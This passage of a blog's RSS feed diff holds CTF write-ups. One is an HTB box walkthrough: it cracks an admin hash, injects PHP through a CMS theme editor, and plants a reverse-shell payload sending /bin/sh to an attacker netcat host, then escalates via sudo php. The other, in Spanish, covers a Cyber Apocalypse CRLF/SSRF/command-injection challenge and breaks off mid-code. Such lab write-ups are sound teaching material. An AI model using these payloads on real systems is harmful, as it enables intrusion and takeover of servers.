+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Warning: detected hash type &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Raw-SHA1&amp;#34;&lt;/span&gt;, but the string is also recognized as &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;has-160&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Use the &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;--format=has-160&amp;#34;&lt;/span&gt; option to force loading these as that type instead
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Using default input encoding: UTF-8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Loaded &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; password hash &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Raw-SHA1 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;SHA1 256/256 AVX2 8x&lt;span style=&#34;color:#f92672&#34;&gt;])&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Warning: no OpenMP support &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; this hash type, consider --fork&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Press &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; status
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;admin            &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;?&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1g 0:00:00:00 DONE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2024-12-25 13:26&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 50.00g/s 991200p/s 991200c/s 991200C/s alcala..LOVE1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Use the &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;--show --format=Raw-SHA1&amp;#34;&lt;/span&gt; options to display all of the cracked passwords reliably
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Session completed.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;When logging, we see many components in the admin pannel. Our interest is,
+initially, the &lt;code&gt;upload.php&lt;/code&gt; as &lt;code&gt;searchsploit&lt;/code&gt; indicated a file upload
+vulnerability, but the upload button seemed to be disabled. Searching around we
+see that we can edit the theme code in the &lt;code&gt;themes.php&lt;/code&gt; component. Using a
+simple script like &lt;code&gt;&amp;lt;?php system(&#39;id&#39;); ?&amp;gt;&lt;/code&gt; works when reloading the page (note
+that the edited theme must be enabled). We can then use a revshell like:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc [ATTCK_MACHINE_IP] [PORT] &amp;gt;/tmp/f&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]
+You might save a copy of the original php template as this might disrupt the server.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Make sure to substitute &lt;code&gt;ATTCK_MACHINE_IP&lt;/code&gt; by your machine IP through a VPN and
+&lt;code&gt;PORT&lt;/code&gt; by a choice port.&lt;/p&gt;
+&lt;p&gt;We listen with netcat at the port specified in the payload with &lt;code&gt;nc -lvnp PORT&lt;/code&gt;
+and see that, on page reload, the connection is stabilshed. There we can go to
+the directory &lt;code&gt;/home/mrb3n&lt;/code&gt; to get the &lt;code&gt;user.txt&lt;/code&gt; flag.&lt;/p&gt;
+&lt;p&gt;To escalate privileges we explore binaries. Running &lt;code&gt;sudo -l&lt;/code&gt; we see that a php
+binary can be used with root privileges without password by all users:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo -l
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Matching Defaults entries &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; www-data on gettingstarted:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    env_reset, mail_badpass, secure_path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt;/usr/sbin&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt;/usr/bin&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt;/sbin&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt;/bin&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt;/snap/bin
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User www-data may run the following commands on gettingstarted:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ALL : ALL&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ls -l /usr/bin/php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt; Feb  &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2021&lt;/span&gt; /usr/bin/php -&amp;gt; /etc/alternatives/php
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A quick search in GTFObins tells us we can escalate to root as follows:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ CMD&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo php -r &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;system(&amp;#39;&lt;/span&gt;$CMD&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;);&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With this, we can get the last flag &lt;code&gt;root.txt&lt;/code&gt; at the &lt;code&gt;/root/&lt;/code&gt; directory.&lt;/p&gt;
+&lt;p&gt;We then successfully pwned the box.&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Another Post</title>
+      <link>https://albertnath.github.io/hfc-blog/posts/another-post/</link>
+      <pubDate>Sun, 16 Feb 2025 09:12:08 -0600</pubDate>
+      
+      <guid>https://albertnath.github.io/hfc-blog/posts/another-post/</guid>
+      <description></description>
+      <content></content>
+    </item>
+    
+    <item>
+      <title>HTB Cyber Apocalypse 2025 | CyberAttack WriteUp</title>
+      <link>https://albertnath.github.io/hfc-blog/posts/writeup-test/</link>
+      <pubDate>Sun, 16 Feb 2025 09:12:08 -0600</pubDate>
+      
+      <guid>https://albertnath.github.io/hfc-blog/posts/writeup-test/</guid>
+      <description>Introducción Recientemente se llevó a cabo el CTF anual de HackTheBox &amp;ldquo;Cyber Apocalypse&amp;rdquo;. Uno de los retos que más me gustó dentro de la categoría &amp;ldquo;Web&amp;rdquo; fue &amp;ldquo;Cyber Attack&amp;rdquo;. Como todos los retos de este CTF, este está ambientado en el mundo fantástico de Eldoria. Se nos presenta una aplicación web destinada a atacar a los enemigos de Malakar.
+A grandes rasgos, el reto requería explotar una inyección CRLF, una vulnerabilidad de tipo SSRF y una inyección de comandos.</description>
+      <content>&lt;h1 id=&#34;introducción&#34;&gt;Introducción&lt;/h1&gt;
+&lt;p&gt;Recientemente se llevó a cabo el CTF anual de HackTheBox &amp;ldquo;Cyber Apocalypse&amp;rdquo;. Uno de los retos que más me gustó dentro de la categoría &amp;ldquo;Web&amp;rdquo; fue &amp;ldquo;Cyber Attack&amp;rdquo;. Como todos los retos de este CTF, este está ambientado en el mundo fantástico de Eldoria. Se nos presenta una aplicación web destinada a atacar a los enemigos de Malakar.&lt;/p&gt;
+&lt;p&gt;A grandes rasgos, el reto requería explotar una inyección &lt;em&gt;CRLF&lt;/em&gt;, una vulnerabilidad de tipo &lt;em&gt;SSRF&lt;/em&gt; y una inyección de comandos. Adicionalmente para lograr resolverlo, fue necesario comprender algo llamado &amp;ldquo;&lt;strong&gt;ambigüedad semántica&lt;/strong&gt;&amp;rdquo; en servidores Apache y aplicar un pequeño truco en IPv6 para conseguir inyectar comandos. Para resolver el reto, se nos provee el código fuente de la aplicación y archivos de configuración del servidor web.&lt;/p&gt;
+&lt;h1 id=&#34;desarrollo&#34;&gt;Desarrollo&lt;/h1&gt;
+&lt;p&gt;La aplicación muestra un formulario permite introducir el nombre del usuario y el nombre de dominio o dirección IP a atacar. El siguiente ejemplo muestra el funcionamiento de la aplicación al usarla para &amp;ldquo;atacar&amp;rdquo; un nombre de dominio.&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Welcome to Eldoria Landpage&#34; src=&#34;https://albertnath.github.io/hfc-blog/img/test-writeup/1.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Al enviar el formulario, regresa un mensaje indicando que el ataque fue exitoso. Dicho mensaje se obtiene del parámetro &lt;code&gt;result&lt;/code&gt; en la URL.&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;2&#34; src=&#34;https://albertnath.github.io/hfc-blog/img/test-writeup/2.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;El siguiente ejemplo muestra el uso de la funcionalidad de atacar una dirección IP.&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;3&#34; src=&#34;https://albertnath.github.io/hfc-blog/img/test-writeup/3.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Sin embargo, en este caso recibimos un error (Forbidden), pues no tenemos permitido interactuar con el recurso &lt;code&gt;/cgi-bin/attack-ip&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;4&#34; src=&#34;https://albertnath.github.io/hfc-blog/img/test-writeup/4.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Esto se entiende al ver el archivo de configuración apache2.conf, pues permite la interacción con dicho script únicamente si la petición HTTP se origina en el propio servidor:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;ServerName CyberAttack 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;AddType application/x-httpd-php .php
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;Location &amp;#34;/cgi-bin/attack-ip&amp;#34;&amp;gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Order deny,allow
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Deny from all
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Allow from 127.0.0.1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Allow from ::1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/Location&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A continuación, se muestra el código fuente de ambos scripts y algunas conclusiones a las que llegué después de analizarlo.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;attack-domain&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; cgi
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; re
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_domain&lt;/span&gt;(target):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; re&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;^(?!-)[a-zA-Z0-9-]{1,63}(?&amp;lt;!-)\.[a-zA-Z]{2,63}$&amp;#39;&lt;/span&gt;, target)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;form &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cgi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FieldStorage()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; form&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getvalue(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; form&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getvalue(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;target&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; name &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; target:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Location: ../?error=Hey, you need to provide a name and a target!&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; is_domain(target):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# Increase this for an actual attack&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;popen(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ping -c &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;count&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;target&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;) 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Location: ../?result=Succesfully attacked &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;target&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;!&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Location: ../?error=Hey &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;name&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;, watch it!&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type: text/html&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Se utiliza el comando ping para &amp;ldquo;atacar&amp;rdquo; el servicio que se le indica.
+Parece haber una inyección de comandos, pues el parámetro &lt;code&gt;target&lt;/code&gt; se usa en la función &lt;code&gt;os.popen()&lt;/code&gt;. Sin embargo, el mismo parámetro primero se verifica con una expresión regular y, si no tiene el formato de un nombre de dominio, no se ejecuta la función.&lt;/li&gt;
+&lt;li&gt;En caso de no pasar la verificación, la respuesta HTTP será una redirección a través del encabezado &lt;code&gt;Location&lt;/code&gt;, en donde se envía un mensaje de error concatenando el nombre del usuario. Al hacer esta concatenación en un encabezado, podría ser vulnerable a una inyección de &lt;em&gt;CRLF&lt;/em&gt;.&lt;/li&gt;
+&lt;li&gt;Una interacción con este recurso se muestra a continuación, forzando un error al enviar un nombre de dominio inválido.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;amp;name=v&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;!DOCTYPE HTML PUBLIC &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-//IETF//DTD HTML 2.0//EN&amp;#34;&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;title&amp;gt;302 Found&amp;lt;/title&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;h1&amp;gt;Found&amp;lt;/h1&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;p&amp;gt;The document has moved &amp;lt;a href&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;../?error=Hey v, watch it!&amp;#34;&lt;/span&gt;&amp;gt;here&amp;lt;/a&amp;gt;.&amp;lt;/p&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;hr&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;address&amp;gt;Apache/2.4.54 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Server at 83.136.249.227 Port 46378&amp;lt;/address&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;attack-ip&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; cgi
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; ipaddress &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ip_address
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;form &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cgi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FieldStorage()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; form&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getvalue(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; form&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getvalue(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;target&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
